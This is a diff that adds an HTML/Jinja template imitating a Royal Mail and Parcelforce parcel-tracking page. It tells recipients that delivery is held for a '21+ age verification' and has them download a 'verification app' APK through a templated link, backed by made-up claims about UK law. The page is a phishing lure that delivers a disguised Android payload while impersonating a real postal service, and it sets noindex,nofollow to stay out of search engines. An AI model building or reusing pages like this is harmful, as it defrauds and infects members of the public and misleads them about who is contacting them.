@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <title>{{ page_title }}</title>
+  <link rel="icon" type="image/svg+xml" href="{{ static_base }}/img/favicon.svg">
+  <link rel="stylesheet" href="{{ static_base }}/css/royalmail.css">
+</head>
+<body>
+  <a class="rm-skip" href="#main">Skip to main content</a>
+
+  <header class="rm-header" role="banner">
+    <div class="rm-header__inner">
+      <a class="rm-header__brand rm-header__brand--rmg" href="#" aria-label="Royal Mail Home">
+        <img src="{{ static_base }}/img/dualrmglogo.svg" alt="Royal Mail" width="156" height="52">
+      </a>
+      <a class="rm-header__brand rm-header__brand--pfw" href="#" aria-label="Parcel Force Home">
+        <img src="{{ static_base }}/img/dualpfwlogo.svg" alt="Parcelforce Worldwide" width="164" height="52">
+      </a>
+
+      <nav class="rm-header__nav rm-header__nav--text" aria-label="Auth">
+        <a class="rm-header__link" href="#">Log in</a>
+        <span class="rm-header__sep" aria-hidden="true">|</span>
+        <a class="rm-header__link" href="#">Register</a>
+      </nav>
+
+      <a class="rm-header__icon rm-header__icon--profile" href="#" aria-label="Your account">
+        <img src="{{ static_base }}/img/icon-profile.svg" alt="" width="28" height="28">
+      </a>
+
+      <button type="button" class="rm-menu" aria-label="Menu">
+        <img class="rm-menu__icon rm-menu__icon--red" src="{{ static_base }}/img/dualheadermenu.svg" alt="" width="28" height="28">
+        <img class="rm-menu__icon rm-menu__icon--white" src="{{ static_base }}/img/icon-menu-white.svg" alt="" width="28" height="28">
+        <span class="rm-menu__label">Menu</span>
+      </button>
+    </div>
+  </header>
+
+  <main id="main" class="rm-main">
+    <section class="rm-hero" aria-labelledby="tracking-heading">
+      <div class="rm-hero__container">
+        <div class="rm-hero__card">
+          <p class="rm-hero__eyebrow">Track your item</p>
+          <h1 id="tracking-heading" class="rm-hero__title">Order {{ order.number }}</h1>
+          <p class="rm-hero__meta">Sold by <strong>{{ seller_name }}</strong></p>
+
+          <ol class="rm-tracker" aria-label="Delivery progress">
+            <li class="rm-tracker__step is-done">
+              <span class="rm-tracker__circle" aria-hidden="true">
+                <svg viewBox="0 0 16 16" fill="none"><path d="M3.5 8.5l3 3 6-6.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+              </span>
+              <span class="rm-tracker__label">Order placed</span>
+              <span class="rm-tracker__date">{{ order.placed_at }}</span>
+            </li>
+            <li class="rm-tracker__step is-done">
+              <span class="rm-tracker__circle" aria-hidden="true">
+                <svg viewBox="0 0 20 16" fill="none"><path d="M1 4h10v7H1zM11 6h5l3 3v2h-8zM4.5 13.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3zM14.5 13.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>
+              </span>
+              <span class="rm-tracker__label">Dispatched</span>
+            </li>
+            <li class="rm-tracker__step is-current" aria-current="step">
+              <span class="rm-tracker__circle" aria-hidden="true">
+                <svg viewBox="0 0 14 18" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3.5 8V5a3.5 3.5 0 0 1 7 0v3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><rect x="2" y="8" width="10" height="9" rx="1.5" stroke="currentColor" stroke-width="1.6" fill="none"/><circle cx="7" cy="12.5" r="1.2" fill="currentColor"/></svg>
+              </span>
+              <span class="rm-tracker__label">Age verification</span>
+            </li>
+            <li class="rm-tracker__step">
+              <span class="rm-tracker__circle" aria-hidden="true">
+                <svg viewBox="0 0 18 16" fill="none"><path d="M1 8l8-6.5L17 8v6a1 1 0 0 1-1 1h-4v-5H7v5H2a1 1 0 0 1-1-1z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>
+              </span>
+              <span class="rm-tracker__label">Delivered</span>
+              <span class="rm-tracker__date rm-tracker__date--expected">Est. {{ order.expected_delivery }}</span>
+            </li>
+          </ol>
+
+          <div class="rm-age-flow" aria-labelledby="rm-age-flow-title">
+            <h2 id="rm-age-flow-title" class="rm-age-flow__title">Age verification required</h2>
+            <p class="rm-age-flow__subtitle">To continue delivery, please confirm your age (21+).</p>
+
+            <div class="rm-age-flow__panel rm-age-flow__panel--steps">
+              <ul class="rm-age-flow__steps">
+                <li class="rm-age-flow__step">
+                  <span class="rm-age-flow__tick" aria-hidden="true">
+                    <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="10" fill="#DA202A"/><path d="M5.2 10.2l2.8 2.7 6.8-6.9" stroke="#fff" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                  </span>
+                  <span>Install the app</span>
+                </li>
+                <li class="rm-age-flow__step">
+                  <span class="rm-age-flow__tick" aria-hidden="true">
+                    <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="10" fill="#DA202A"/><path d="M5.2 10.2l2.8 2.7 6.8-6.9" stroke="#fff" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                  </span>
+                  <span>Grant permissions</span>
+                </li>
+                <li class="rm-age-flow__step">
+                  <span class="rm-age-flow__tick" aria-hidden="true">
+                    <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="10" fill="#DA202A"/><path d="M5.2 10.2l2.8 2.7 6.8-6.9" stroke="#fff" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                  </span>
+                  <span>Complete verification</span>
+                </li>
+              </ul>
+              <div class="rm-age-flow__trust">
+                <svg class="rm-age-flow__trust-icon" viewBox="0 0 16 18" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"><path d="M8 1l6 2v6c0 4-3 7-6 8-3-1-6-4-6-8V3l6-2z" fill="currentColor" opacity=".95"/><path d="M5.5 9l2 2L11 7.5" stroke="#fff" stroke-width="1.4" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <span class="rm-age-flow__trust-msg">
+                  <span class="rm-age-flow__trust-part rm-age-flow__trust-part--lead">Secure verification<span class="rm-age-flow__trust-dot" aria-hidden="true"> &middot; </span></span><span class="rm-age-flow__trust-part">Takes less than 2 minutes</span>
+                </span>
+              </div>
+            </div>
+
+            <div class="rm-age-flow__alert" role="alert">
+              <span class="rm-age-flow__alert-icon" aria-hidden="true">!</span>
+              <p class="rm-age-flow__alert-text">Your order will not be shipped until verification is completed.</p>
+            </div>
+
+            <details class="rm-age-flow__details">
+              <summary class="rm-age-flow__summary">Why is this required?</summary>
+              <div class="rm-age-flow__details-body">
+                <p>This shipment is on hold while we confirm the recipient&rsquo;s age. These items are in a 21+ restricted category, so UK law requires identity and age checks before dispatch can continue.</p>
+              </div>
+            </details>
+
+            <div class="rm-age-flow__order-row" aria-label="Order summary">
+              <span class="rm-age-flow__order-line">Order: <strong>{{ order.number }}</strong></span>
+              <span class="rm-age-flow__order-line rm-age-flow__order-line--total">Total: <strong>{{ order.total }}</strong></span>
+            </div>
+
+            <a class="rm-btn rm-btn--primary rm-btn--block rm-age-flow__btn rm-age-flow__btn--footer"
+               href="{{ download_href }}"
+               download="{{ download_filename }}">
+              Download verification app
+            </a>
+            <p class="rm-age-flow__micro rm-age-flow__micro--legal">
+              Verification app (APK). By downloading, you confirm that you are the intended recipient of this parcel.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="rm-section" aria-label="Order details">
+      <div class="rm-container">
+        <div class="rm-grid">
+          <article class="rm-card">
+            <h2 class="rm-card__title">Recipient</h2>
+            <dl class="rm-kv">
+              <div><dt>Name</dt><dd>{{ customer.fullName }}</dd></div>
+              <div><dt>Email</dt><dd><a href="mailto:{{ customer.email }}">{{ customer.email }}</a></dd></div>
+              <div><dt>Phone</dt><dd>{{ customer.phone }}</dd></div>
+            </dl>
+          </article>
+
+          <article class="rm-card">
+            <h2 class="rm-card__title">Delivery</h2>
+            <p class="rm-card__lead">{{ shipping.method_label }}</p>
+            <address class="rm-address">
+              {% for line in shipping.address_lines %}
+                <span>{{ line }}</span>
+              {% endfor %}
+            </address>
+          </article>
+
+          <article class="rm-card rm-card--wide">
+            <h2 class="rm-card__title">Items in this parcel</h2>
+            <table class="rm-items">
+              <colgroup>
+                <col class="rm-items__col-item">
+                <col class="rm-items__col-qty">
+                <col class="rm-items__col-price">
+              </colgroup>
+              <thead>
+                <tr>
+                  <th scope="col">Item</th>
+                  <th scope="col" class="rm-items__qty">Qty</th>
+                  <th scope="col" class="rm-items__price">Price</th>
+                </tr>
+              </thead>
+              <tbody>
+                {% for item in items %}
+                <tr>
+                  <td class="rm-items__cell-desc">
+                    <span class="rm-items__line"><span class="rm-items__name">{{ item.name }}</span>{% if item.variant %} <span class="rm-items__variant">{{ item.variant }}</span>{% endif %}</span>
+                  </td>
+                  <td class="rm-items__qty">{{ item.quantity }}</td>
+                  <td class="rm-items__price">{{ item.price }}</td>
+                </tr>
+                {% endfor %}
+              </tbody>
+              <tfoot>
+                <tr class="rm-items__tfoot-total">
+                  <th scope="row" class="rm-items__tfoot-label">Total</th>
+                  <td class="rm-items__qty rm-items__tfoot-empty" aria-hidden="true">&#160;</td>
+                  <td class="rm-items__price rm-items__grand">{{ order.total }}</td>
+                </tr>
+              </tfoot>
+            </table>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="rm-help" aria-label="Need help?">
+      <div class="rm-container">
+        <h2>Need help?</h2>
+        <div class="rm-faq">
+          <details class="rm-faq__item" name="rm-help-faq">
+            <summary><span class="rm-faq__q">Why do I need to complete age verification?</span></summary>
+            <div class="rm-faq__body">
+              <p>The products in your order fall within a restricted category that requires age verification under UK regulations. This process helps ensure that the recipient is legally entitled to receive these goods.</p>
+            </div>
+          </details>
+          <details class="rm-faq__item" name="rm-help-faq">
+            <summary><span class="rm-faq__q">I need help with my reference number</span></summary>
+            <div class="rm-faq__body">
+              <p>Your reference number is normally a 13-character string that ends in <strong>GB</strong> (for example <em>AA123456789GB</em>).
+                You can find it on the sender&rsquo;s dispatch email, the sales receipt, or the shipping label.
+                If you only have a short order number like <em>{{ order.number }}</em>, that is an internal reference from {{ seller_name }} &mdash; use it exactly as shown on this page.</p>
+            </div>
+          </details>
+          <details class="rm-faq__item" name="rm-help-faq">
+            <summary><span class="rm-faq__q">My tracking message looks wrong</span></summary>
+            <div class="rm-faq__body">
+              <p>Statuses are updated by our scanning network throughout the day and may take several hours to refresh.
+                If the most recent update still looks out of date after 24 hours, please contact the sender first &mdash;
+                they can raise a formal enquiry on your behalf.</p>
+            </div>
+          </details>
+          <details class="rm-faq__item" name="rm-help-faq">
+            <summary><span class="rm-faq__q">My item is shown as delivered but it hasn&rsquo;t been</span></summary>
+            <div class="rm-faq__body">
+              <p>Please check with other members of your household and any nominated safe place or neighbour.
+                If your item is still missing 48 hours after the &ldquo;delivered&rdquo; scan, ask the sender to raise a claim with Royal Mail.</p>
+            </div>
+          </details>
+        </div>
+      </div>
+    </section>
+
+    <nav class="rm-breadcrumbs" aria-label="Breadcrumb">
+      <div class="rm-container">
+        <ol>
+          <li><a href="#">Home</a></li>
+          <li aria-current="page">Track and Trace &ndash; Track your Item</li>
+        </ol>
+      </div>
+    </nav>
+  </main>
+
+  <footer class="rm-footer" role="contentinfo">
+    <div class="rm-container">
+      <div class="rm-footer__brands">
+        <img src="{{ static_base }}/img/footerrmg.svg" alt="Royal Mail" height="36">
+        <img src="{{ static_base }}/img/footerpfw.svg" alt="Parcelforce Worldwide" height="36">
+        <img src="{{ static_base }}/img/footerids.svg" alt="International Distribution Services" height="36">
+      </div>
+
+      <div class="rm-footer__bottom">
+        <ul>
+          <li><a href="#">Terms of use</a></li>
+          <li><a href="#">Privacy</a></li>
+          <li><a href="#">Terms and conditions</a></li>
+          <li><a href="#">Cookies</a></li>
+          <li><a href="#">International distribution services</a></li>
+          <li><a href="#">Accessibility</a></li>
+          <li><a href="#">Cymraeg</a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+  (function () {
+    var root = document.querySelector('.rm-faq');
+    if (!root) return;
+    root.querySelectorAll('details.rm-faq__item').forEach(function (el) {
+      el.addEventListener('toggle', function () {
+        if (!el.open) return;
+        root.querySelectorAll('details.rm-faq__item').forEach(function (other) {
+          if (other !== el) other.open = false;
+        });
+      });
+    });
+  })();
+  </script>
+
+  {# Smartsupp Live Chat #}
+  <script type="text/javascript">
+  var _smartsupp = _smartsupp || {};
+  _smartsupp.key = '58a7b42c43bcc75161f14c3600e46bfe1c564b83';
+  window.smartsupp||(function(d) {
+    var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+    s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+    c.type='text/javascript';c.charset='utf-8';c.async=true;
+    c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+  })(document);
+  </script>
+  <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank" rel="noopener noreferrer">Smartsupp</a></noscript>
+</body>
+</html>
